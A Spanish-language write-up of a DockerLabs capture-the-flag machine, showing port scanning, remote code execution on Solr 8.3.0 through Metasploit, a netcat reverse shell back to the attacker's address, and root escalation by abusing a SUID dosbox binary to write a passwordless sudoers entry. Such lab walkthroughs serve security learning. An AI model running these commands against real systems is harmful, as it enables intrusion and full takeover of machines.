# Máquina Eclipse
Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/RG0whSrR#dhO_VHaG-BK8A6NcVwiAhYWxZiStdYj9yT3DFWGiVEQ)

- **Nombre de la Máquina:** Fooding
- **Sistema Operativo**: Linux
- **Dificultad:** Medium
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
	- Slor 8.3.0 Remote Code Execution via Velocity Template

### Reconocimiento y enumeración
Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina víctima para ver que puertos tiene abiertos.
```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```
![Pasted image 20240709193254](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/e0741a7d-94f7-4c97-a521-6c77e238e1d3)

Nos reporta el puerto 80 y el puerto 8983, haremos un escaneo mas exhaustivo para ver que corre por cada puerto.
```bash
sudo nmap -p 80,8983 -sCV 172.17.0.2 -oN targeted.txt
```
![Pasted image 20240709193514](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/16ab5a02-6480-4993-98f3-1209a06c73cc)

- Puerto 80: HTTP Apache
- Puerto 8983: Solr Admin

Después de analizar el informe de nmap, identificamos que el puerto 80 está activo y ejecuta un servicio Apache. Además, notamos que en el puerto 8983 se está ejecutando otro servicio, que es un servidor web desarrollado en Java y empleado para realizar búsquedas específicas, como las que se realizan dentro de un blog.

En el puerto 80 solo encontramos una imagen, la cual no nos aporta información útil, por lo que decidí investigar más a fondo el servicio Solr.

![Pasted image 20240709194022](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/176f0ce5-e677-46b7-b68b-906ab788f86d)

Como podemos observar en el panel de control, se muestra la versión del servicio. Con esta información, procedo a investigar si existen vulnerabilidades explotables.

Tuvimos suerte y encontramos varios métodos de explotación. Básicamente, es el mismo procedimiento, pero con diferentes enfoques: uno utilizando Metasploit y otro empleando un script en Python.
[Exploit Solr 8.3.0](https://www.exploit-db.com/exploits/48338)

### Explotación

    - Utilizo tanto el método con msfconsole como con el script.

Con Metasploit, sigo los pasos después de analizarlos cuidadosamente y los adapto a mi entorno.

#### Metasploit
Buscamos el exploit con el comando:
```bash
search solr
```
![Pasted image 20240709195212](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/e2c2ae74-3d41-431a-8829-aec31a474756)


```bash
use 0
set RHOSTS 172.17.0.2
set LHOST 172.17.0.1
check
```
![Pasted image 20240709195413](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/fa080517-d09c-4c7f-a63e-903089e2d3f6)

Al poner check, nos dice que el target es vulnerable.
![Pasted image 20240709195557](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/eec4a79e-ff88-4b9c-bbe2-9a8808fbb308)

Ejecutamos el comando run y estaremos dentro de la máquina como usuario ninhack.
![Pasted image 20240709195738](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/b4d64aff-c782-4e28-864a-11f5adeebc3a)


### Escalada de privilegios
Primero me mandé una shell para trabajar mas cómodo con el siguiente comando:
```bash
nc 172.17.0.1 1234 -e /bin/bash
```

Para la escalada de privilegios primero probé  con sudo y nos pide contraseña así que me puse a investigar y vi que tengo permisos SUID con el binario **dosbox**.
```bash
find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/su
/usr/bin/dosbox
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Miro en la página [GTFOBins](https://gtfobins.github.io/gtfobins/dosbox/#suid) y encuentro justo el método para escalar privilegios usando ese script.

Después de investigar un poco, entiendo que este binario nos permite escribir en el sistema. Esto nos da la posibilidad de modificar ciertos archivos para obtener privilegios de root.

Para finalizar la explotación, realizo lo siguiente con sudoers:

```bash
LFILE='\etc\sudoers.d\ninhack'
/usr/bin/dosbox -c 'mount c /' -c "echo ninhack ALL=(ALL:ALL) NOPASSWD: ALL >c:$LFILE" -c exit
```

Una vez ejecutados esos comandos, solo necesitamos ejecutar `sudo su` para convertirnos en usuario root.
![Pasted image 20240709201931](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/18a446b4-a44b-42b3-b540-580cc1d50a51)
